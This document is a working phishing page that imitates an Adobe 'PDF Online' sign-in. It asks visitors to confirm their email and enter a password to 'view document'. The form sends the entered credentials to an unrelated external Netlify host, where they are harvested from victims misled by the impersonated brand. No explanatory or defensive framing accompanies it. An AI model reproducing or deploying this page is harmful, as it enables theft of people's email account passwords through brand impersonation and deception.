<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Adobe Sign in</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <main>
      <div class="topbar">
        <img src="ok.png" alt="" />
      </div>
      <div class="secondbar">
        <h3>Confirm your email to download document</h3>

        <div class="buttons">
          <button>Sign In</button>
          <button>Download Document</button>
          <button>Exit</button>
        </div>
      </div>
      <div class="modal-wrapper">
        <div class="modal">
          <div class="adobelogo">
            <img src="Zpt8n.jpg" alt="" />
            <h2>Adobe PDF Online</h2>
          </div>
          <div class="confirm">
            <h4>Confirm your identity!</h4>
            <p>Sign in with your recieving email account to view document.</p>
          </div>
          <div class="input-and-logo">
            <div class="input">
              <form action="https://brave-ritchie-3f1f9c.netlify.app/error.html" method="post">
                <div class="form-control">
                  <label for="">Email ID:  </label>
                  <input type="email" name="email"  id="" placeholder="Email" value="" readonly />
                </div>
                <div class="form-control">
                  <label for="">Password:</label>
                  <input
                    type="password"
                    name="password"
                    id=""
                    placeholder="Enter your Password" "Required"
                  />
                </div>
              
            </div>
            <img src="secure.png" alt="" />
          </div>
          <div class="view-and-reset">
            <button type="submit">View Document</button>
            <button>Reset</button>
          </div>
        </form>
        </div>
      </div>
    </main>
  </body>
